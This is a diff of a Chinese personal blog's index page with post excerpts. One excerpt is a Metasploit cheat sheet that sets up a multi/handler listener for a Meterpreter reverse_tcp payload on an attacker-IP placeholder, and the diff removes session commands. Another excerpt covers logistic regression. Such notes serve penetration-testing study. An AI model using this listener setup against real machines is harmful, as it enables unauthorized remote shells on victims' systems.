@@ -177,7 +177,6 @@
         <h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole:"></a>msfconsole:</h3><p><strong>reverese:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler </span><br><span class="line">show options </span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp </span><br><span class="line">set LHOST [AttackerIP] # 如果是公网vps，这里最好写一个内网ip，否则可能会影响后边load。。看issue里写的</span><br><span class="line">set LPORT [AttackerPort] #默认4444端口 </span><br><span class="line"></span><br><span class="line">运行这两条命令后，4444端口会一直在后台处于侦听状态</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure></p>
 <p><strong>bind:</strong></p>
 <p><code>windows/x64/meterpreter/bind_tcp</code></p>
-<p><strong>session</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在Meterpreter Shell中退出session使用 `exit`；</span><br><span class="line"></span><br><span class="line">在模块界面删除session使用 `session -k sessionID`；</span><br><span class="line"></span><br><span class="line">退到后台是 `background`；</span><br></pre></td></tr></table></figure></p>
         
           <a class="article-more-a" href="/2018/12/31/msf&nmap常用基本操作/#more">more >></a>
         
@@ -259,9 +258,7 @@
 <p><img src="http://pkhzw7gpb.bkt.clouddn.com/image/Logistic%20Regression/3.png" alt="Sigmoid"></p>
 <p>从上图可以看到sigmoid函数是一个s形的曲线，它的取值在[0, 1]之间，在远离0的地方函数的值会很快接近0或者1。它的这个特性对于解决二分类问题十分重要</p>
 <p>接下来将该假设函数与逻辑回归结合：</p>
-<p>$$<br>h_\theta(x) = g(\theta^T x), g(z)= \frac{1}{1+e^{-z}}<br>$$<br>其中 <strong><em>x</em></strong> 是我们的输入，向量 <strong><em>θ</em></strong>  为我们要求取的参数。</p>
-<p>接下来的逻辑回归要做的就是：求出一组最好的 <strong><em>θ</em></strong>  ,使得该函数的输出<strong>P</strong>的正确率最满足实际情况。</p>
-<p>$$<br>P(y=1|x;\theta) =g(\theta^Tx)= \frac{1}{1+e^{-\theta^Tx}}<br>$$<br>这个函数的意思就是在给定 <strong><em>x</em></strong>  和 <strong><em>θ</em></strong>  的条件下  <strong><em>y=1</em></strong>   的概率。<br>
+<p>$$<br>h_\theta(x) = g(\theta^T x), g(z)= \frac{1}{1+e^{-z}}<br>$$<br>其中 <strong><em>x</em></strong> 是我们的输入，向量 <strong><em>θ</em></strong>  为我们要求取的参数。<br>
         
           <a class="article-more-a" href="/2018/12/29/Logistic-Regression-Basic/#more">more >></a>
         
@@ -599,7 +596,7 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">工具使用</a>
+                <a href="javascript:void(0)" class="js-tag color3">Machine Learning Basic</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -607,7 +604,7 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Machine Learning Basic</a>
+                <a href="javascript:void(0)" class="js-tag color5">工具使用</a>
               </li>
             
             <div class="clearfix"></div>
